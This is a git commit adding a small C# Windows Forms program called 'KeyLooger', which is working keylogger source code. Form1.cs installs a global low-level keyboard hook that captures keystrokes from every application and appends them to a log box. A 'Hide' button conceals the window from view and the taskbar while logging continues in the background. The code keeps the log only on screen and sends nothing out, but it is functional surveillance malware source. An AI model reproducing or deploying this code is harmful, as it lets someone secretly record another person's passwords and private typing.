e5c72d4636a328a3b480292725be9320d24de883
Nader Alaa <nader_alaa_244@fci.helwan.edu.eg>
2017-07-05 19:24:46 +0200

    Add project files.

---
+++ Form1.Designer.cs
@@ -0,0 +1,134 @@
+﻿namespace KeyLooger
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.startbutton = new System.Windows.Forms.Button();
+            this.stopbutton = new System.Windows.Forms.Button();
+            this.hidebutton = new System.Windows.Forms.Button();
+            this.keylooger_notifyIcon = new System.Windows.Forms.NotifyIcon(this.components);
+            this.label1 = new System.Windows.Forms.Label();
+            textbox_log = new System.Windows.Forms.TextBox();
+            this.SuspendLayout();
+            // 
+            // startbutton
+            // 
+            this.startbutton.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.startbutton.ForeColor = System.Drawing.SystemColors.ControlText;
+            this.startbutton.Location = new System.Drawing.Point(12, 226);
+            this.startbutton.Name = "startbutton";
+            this.startbutton.Size = new System.Drawing.Size(75, 23);
+            this.startbutton.TabIndex = 0;
+            this.startbutton.Text = "Start";
+            this.startbutton.UseVisualStyleBackColor = true;
+            this.startbutton.Click += new System.EventHandler(this.startbutton_Click);
+            // 
+            // stopbutton
+            // 
+            this.stopbutton.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.stopbutton.Location = new System.Drawing.Point(197, 226);
+            this.stopbutton.Name = "stopbutton";
+            this.stopbutton.Size = new System.Drawing.Size(75, 23);
+            this.stopbutton.TabIndex = 1;
+            this.stopbutton.Text = "Stop";
+            this.stopbutton.UseVisualStyleBackColor = true;
+            this.stopbutton.Click += new System.EventHandler(this.stopbutton_Click);
+            // 
+            // hidebutton
+            // 
+            this.hidebutton.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.hidebutton.Location = new System.Drawing.Point(105, 226);
+            this.hidebutton.Name = "hidebutton";
+            this.hidebutton.Size = new System.Drawing.Size(75, 23);
+            this.hidebutton.TabIndex = 2;
+            this.hidebutton.Text = "Hide";
+            this.hidebutton.UseVisualStyleBackColor = true;
+            this.hidebutton.Click += new System.EventHandler(this.hidebutton_Click);
+            // 
+            // keylooger_notifyIcon
+            // 
+            this.keylooger_notifyIcon.BalloonTipIcon = System.Windows.Forms.ToolTipIcon.Info;
+            this.keylooger_notifyIcon.BalloonTipText = "KeyLooger Still Working";
+            this.keylooger_notifyIcon.Icon = ((System.Drawing.Icon)(resources.GetObject("keylooger_notifyIcon.Icon")));
+            this.keylooger_notifyIcon.Text = "KeyLooger";
+            this.keylooger_notifyIcon.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.keylooger_notifyIcon_MouseDoubleClick);
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label1.Location = new System.Drawing.Point(21, 9);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(242, 25);
+            this.label1.TabIndex = 3;
+            this.label1.Text = "Welcome To KeyLogger";
+            // 
+            // textbox_log
+            // 
+            textbox_log.Location = new System.Drawing.Point(13, 37);
+            textbox_log.Multiline = true;
+            textbox_log.Name = "textbox_log";
+            textbox_log.ReadOnly = true;
+            textbox_log.RightToLeft = System.Windows.Forms.RightToLeft.No;
+            textbox_log.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
+            textbox_log.Size = new System.Drawing.Size(259, 183);
+            textbox_log.TabIndex = 4;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(284, 261);
+            this.Controls.Add(textbox_log);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.hidebutton);
+            this.Controls.Add(this.stopbutton);
+            this.Controls.Add(this.startbutton);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.MaximizeBox = false;
+            this.Name = "Form1";
+            this.Text = "KeyLooger";
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button startbutton;
+        private System.Windows.Forms.Button stopbutton;
+        private System.Windows.Forms.Button hidebutton;
+        private System.Windows.Forms.NotifyIcon keylooger_notifyIcon;
+        private System.Windows.Forms.Label label1;
+        public static System.Windows.Forms.TextBox textbox_log;
+    }
+}
+
---
+++ Form1.cs
@@ -0,0 +1,90 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.IO;
+
+namespace KeyLooger
+{
+    public partial class Form1 : Form
+    {
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook,
+        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
+            IntPtr wParam, IntPtr lParam);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+        private static LowLevelKeyboardProc _proc = HookCallback;
+        private static IntPtr _hookID = IntPtr.Zero;
+
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void hidebutton_Click(object sender, EventArgs e)
+        {
+            keylooger_notifyIcon.Visible = true;
+            keylooger_notifyIcon.ShowBalloonTip(500);
+            this.ShowInTaskbar = false;
+            this.Visible = false;
+        }
+
+        private void keylooger_notifyIcon_MouseDoubleClick(object sender, MouseEventArgs e)
+        {
+            keylooger_notifyIcon.Visible = false;
+            this.ShowInTaskbar = true;
+            this.Visible = true;
+        }
+
+        private void startbutton_Click(object sender, EventArgs e)
+        {
+            _hookID = SetHook(_proc);
+        }
+
+        private void stopbutton_Click(object sender, EventArgs e)
+        {
+            UnhookWindowsHookEx(_hookID);
+        }
+
+
+
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+                textbox_log.Text += " '"+(Keys)vkCode+"' ";
+            }
+            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+        }
+        private static IntPtr SetHook(LowLevelKeyboardProc proc)
+        {
+            using (Process curProcess = Process.GetCurrentProcess())
+            using (ProcessModule curModule = curProcess.MainModule)
+            {
+                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
+            }
+        }
+
+    }
+}
